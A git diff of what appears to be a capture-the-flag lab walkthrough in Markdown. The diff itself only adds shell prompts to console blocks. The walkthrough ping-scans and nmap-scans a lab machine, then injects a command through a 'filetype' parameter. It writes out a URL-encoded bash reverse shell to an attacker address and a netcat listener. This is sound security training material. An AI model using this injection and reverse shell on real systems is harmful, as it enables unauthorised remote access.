@@ -20,7 +20,7 @@ image:
 Before to start we have to view if the machine is active throutgh **ICMP** ping.
 
 ```console
- ping -c 1 10.10.11.182
+ $ ping -c 1 10.10.11.182
  --------
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 181.901/181.901/181.901/0.000 ms
@@ -32,7 +32,7 @@ rtt min/avg/max/mdev = 181.901/181.901/181.901/0.000 ms
 Now we are started to scan the IP machine with [**nmap**] with this commands.
 
 ```console
-nmap -p- --open -sCV --min-rate 5000 -v -n -Pn 10.10.11.182 
+$ nmap -p- --open -sCV --min-rate 5000 -v -n -Pn 10.10.11.182 
 ```
 And this is the output:
 ```console
@@ -91,7 +91,7 @@ Send it to repeater tool we are going to change any variable from `filetype` par
 verify the response with a **500 code** **[Internal Server Error]** we are going to test if it works to do a [**reverse shell**], on this parameter we are put to next to `jpg` adding `;` and write the next reverse shell code *(PD: encoded on url because we'll have an error from the syntaxis due for the commas)* on my case I'll use from *bash* method with **Netcat** listener
 
 ```console
-bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
+$ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
 ```
 > You can see others methods from this [**web**](https://sentrywhale.com/documentation/reverse-shell) fi you want :D.
 {: .prompt-tip }
@@ -99,7 +99,7 @@ bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.17%2F4040%200%3E%261
 Now we are lsitening from our terminal with netcat see any response
 
 ```console
-nc -lvnp 4040
+$ nc -lvnp 4040
 
 Listening on [any] 0.0.0.0 4040 ...
 ```
